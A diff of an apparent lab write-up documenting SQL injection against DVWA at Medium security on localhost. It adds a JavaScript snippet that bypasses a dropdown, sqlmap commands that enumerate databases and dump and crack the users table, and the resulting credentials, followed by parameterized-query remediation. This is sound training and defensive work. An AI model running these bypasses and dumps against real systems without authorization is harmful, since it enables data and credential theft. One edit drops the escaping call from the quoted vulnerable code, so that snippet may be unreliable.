@@ -4,7 +4,7 @@
 
 This report documents an advanced SQL injection assessment conducted against DVWA running at Medium security level. The assessment demonstrated that security filters designed to prevent SQL injection can be bypassed using alternative techniques, and that a determined attacker can extract complete database credentials even from a system with basic input filtering in place.
 
-During this assessment, four payloads were successfully executed against the target application, resulting in the complete enumeration of the database schema and extraction of all user credentials including password hashes. The overall risk level of this vulnerability is rated Critical.
+During this assessment, four manual payloads were successfully executed against the target application, resulting in the complete enumeration of the database schema and extraction of all user credentials including password hashes. Additionally, sqlmap was used to automate the same discovery process, successfully cracking the extracted password hashes automatically. The overall risk level of this vulnerability is rated Critical.
 
 **Business Impact:** A SQL injection vulnerability of this severity in a production application would allow an attacker to extract every record from the database, including customer personal data, financial records, and user credentials. Depending on database configuration, it may also allow an attacker to read system files or execute operating system commands. The reputational, financial, and regulatory consequences of such a breach would be severe, including potential GDPR violations, customer notification obligations, and significant remediation costs.
 
@@ -38,7 +38,11 @@ At Low security, DVWA accepts free text input directly. At Medium security, DVWA
 
 **How we bypassed both defenses:**
 
-The dropdown was bypassed by modifying the HTML form directly using browser developer tools, replacing the select element with a text input field.
+The dropdown was bypassed by modifying the HTML form directly using browser developer tools, replacing the select element with a text input field using:
+
+```javascript
+document.querySelector('select[name="id"]').outerHTML = '<input type="text" name="id">'
+```
 
 The quote stripping was bypassed using two techniques:
 - **Numeric injection:** Payloads that do not require quotes (e.g., `1 OR 1=1` instead of `1' OR '1'='1`)
@@ -46,7 +50,7 @@ The quote stripping was bypassed using two techniques:
 
 ---
 
-## Attack Methodology
+## Manual Attack Methodology
 
 ### Payload 1: Numeric OR Injection
 
@@ -66,7 +70,7 @@ See screenshot: `sqli9_1_or_injection.png`
 
 **Technique:** UNION-based information schema query
 
-**Result:** Complete list of all tables across all databases on the server including information_schema, sys, performance_schema, and dvwa databases
+**Result:** Complete list of all tables across all databases on the server including information_schema, sys, performance_schema, and dvwa databases.
 
 **Significance:** Gives the attacker a complete map of the database server before targeting specific tables.
 
@@ -111,6 +115,52 @@ See screenshot: `sqli9_4_credential_extraction.png`
 
 ---
 
+## sqlmap Automated Discovery (Bonus)
+
+sqlmap was used to automate the SQL injection discovery and exploitation process for comparison against manual findings.
+
+### Database Enumeration
+
+```bash
+sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=medium" --dbs --batch
+```
+
+Result: Three databases identified: dvwa, information_schema, sys — matching manual findings exactly.
+
+See screenshot: `sqli9_5_sqlmap_dbs.png`
+
+### Credential Extraction and Password Cracking
+
+```bash
+sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=medium" -D dvwa -T users --dump --batch
+```
+
+Result: sqlmap extracted all usernames and MD5 hashes, then automatically cracked the passwords using its built-in dictionary:
+
+| Username | Cracked Password |
+|----------|-----------------|
+| admin | password |
+| gordonb | abc123 |
+| 1337 | charley |
+| pablo | letmein |
+| smithy | password |
+
+See screenshot: `sqli9_6_sqlmap_dump.png`
+
+### Manual vs sqlmap Comparison
+
+| Task | Manual | sqlmap |
+|------|--------|--------|
+| Finding vulnerability | Tested payloads manually | Automatically detected in seconds |
+| Database enumeration | Required crafting UNION queries | Single flag --dbs |
+| Column enumeration | Required hex encoding bypass | Automatic |
+| Credential extraction | Got hashes only | Got hashes AND cracked passwords |
+| Time required | Several minutes | Under 30 seconds |
+
+sqlmap demonstrates that automated tools dramatically accelerate SQL injection exploitation. However, understanding manual techniques is essential for situations where automated tools are blocked by WAFs or rate limiting, and for understanding why the vulnerability exists at a fundamental level.
+
+---
+
 ## Remediation
 
 ### Why This Vulnerability Exists
@@ -121,12 +171,10 @@ The vulnerable code pattern:
 
 ```php
 $id = $_POST['id'];
-$id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ?
-    mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id) : "");
 $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
 ```
 
-Even with escaping applied, inserting the variable directly into the query without parameterization leaves the application vulnerable to numeric injection.
+Even with quote stripping applied, inserting the variable directly into the query without parameterization leaves the application vulnerable to numeric injection.
 
 ### Fix 1: Parameterized Queries in PHP
 
@@ -161,9 +209,9 @@ The `%s` placeholder is filled by the database driver with the sanitized value o
 ### Additional Defenses
 
 - **Input validation:** Validate that the user_id field contains only numeric digits before passing it to the database
-- **Least privilege:** The database account used by the application should only have SELECT permission on required tables, preventing data modification or system file access
+- **Least privilege:** The database account used by the application should only have SELECT permission on required tables
 - **Web Application Firewall:** Deploy a WAF to detect and block common injection patterns at the network perimeter
-- **Error handling:** Never display raw database error messages to users, as they reveal schema information useful for injection attacks
+- **Error handling:** Never display raw database error messages to users as they reveal schema information useful for injection attacks
 
 ---
 
@@ -171,6 +219,7 @@ The `%s` placeholder is filled by the database driver with the sanitized value o
 
 - Input filtering using blacklists is not a reliable defense against SQL injection. Attackers can bypass quote stripping using numeric injection and hex encoding.
 - A determined attacker who can enumerate the database schema can extract any data the database user has access to, regardless of how complex the table structure is.
+- Automated tools like sqlmap can discover, exploit, and crack credentials from a vulnerable application in under 30 seconds, demonstrating the urgency of fixing SQL injection vulnerabilities immediately.
 - The progression from Low to Medium security in DVWA illustrates why defense-in-depth matters. Each additional filter adds friction but does not prevent exploitation by someone who understands the underlying vulnerability.
 - Parameterized queries are the only reliable fix for SQL injection. All other controls should be treated as supplementary layers, not primary defenses.
 
@@ -181,7 +230,7 @@ The `%s` placeholder is filled by the database driver with the sanitized value o
 - PortSwigger Web Security Academy — SQL Injection: https://portswigger.net/web-security/sql-injection
 - OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
 - OWASP Testing Guide — SQL Injection: https://owasp.org/www-project-web-security-testing-guide/
+- sqlmap Official Documentation: https://sqlmap.org/
 - MITRE ATT&CK — Exploit Public Facing Application: https://attack.mitre.org/techniques/T1190/
-- NIST — SQL Injection: https://www.nist.gov/publications/guide-enterprise-patch-management-planning
 - PHP PDO Prepared Statements: https://www.php.net/manual/en/pdo.prepared-statements.php
 - Python MySQL Connector: https://dev.mysql.com/doc/connector-python/en/
